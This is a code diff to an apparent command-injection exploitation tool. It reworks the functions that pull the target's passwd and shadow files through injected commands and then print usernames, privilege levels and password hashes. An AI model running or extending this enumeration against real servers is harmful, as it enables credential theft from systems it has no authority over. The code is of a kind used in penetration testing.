@@ -137,26 +137,34 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
   cmd = settings.SYS_USERS             
   response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
   sys_users = cb_injector.injection_results(response, TAG)
+
   if sys_users :
-    sys_users = "".join(str(p) for p in sys_users)
-    sys_users = sys_users.replace("(@)", "\n")
-    sys_users = sys_users.split()
-    if len(sys_users) != 0 :
-      if menu.options.verbose:
-        print ""
-      sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
-      sys.stdout.flush()
+    sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+    sys.stdout.flush()
+    sys_users = "".join(str(p) for p in sys_users).strip()
+    if len(sys_users.split(" ")) <= 1 :
+      sys_users = sys_users.split("\n")
+    else:
+      sys_users = sys_users.split(" ")
+    sys_users_list = []
+    for user in range(0, len(sys_users), 3):
+       sys_users_list.append(sys_users[user : user + 3])
+    if len(sys_users_list) != 0 :
       sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
+      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
       sys.stdout.flush()
       # Add infos to logs file.   
       output_file = open(filename, "a")
-      output_file.write("    (!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n")
+      output_file.write("    (!) Identified " + str(len(sys_users_list)) + " entries in '" + settings.PASSWD_FILE + "'.\n")
       output_file.close()
       count = 0
-      for line in sys_users:
+      for user in range(0, len(sys_users_list)):
+        sys_users = sys_users_list[user]
+        sys_users = ":".join(str(p) for p in sys_users)
+        if menu.options.verbose:
+          print ""
         count = count + 1
-        fields = line.split(":")
+        fields = sys_users.split(":")
         # System users privileges enumeration
         if menu.options.privileges:
           if int(fields[1]) == 0:
@@ -187,6 +195,8 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
         output_file.write("      ("+str(count)+") '" + fields[0]+ "'" + is_privilleged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
         output_file.close()
     else:
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      sys.stdout.flush()
       print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
 
 
@@ -201,7 +211,7 @@ def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_me
     sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
     sys.stdout.flush()
     sys_passes = "".join(str(p) for p in sys_passes)
-    sys_passes = sys_passes.replace("(@)", "\n")
+    sys_passes = sys_passes.replace(" ", "\n")
     sys_passes = sys_passes.split( )
     if len(sys_passes) != 0 :
       sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
@@ -215,7 +225,7 @@ def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_me
       for line in sys_passes:
         count = count + 1
         fields = line.split(":")
-        if fields[1] != "*" and fields[1] != "!!" and fields[1] != "":
+        if fields[1] != "*" and fields[1] != "!" and fields[1] != "":
           print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
           # Add infos to logs file.   
           output_file = open(filename, "a")
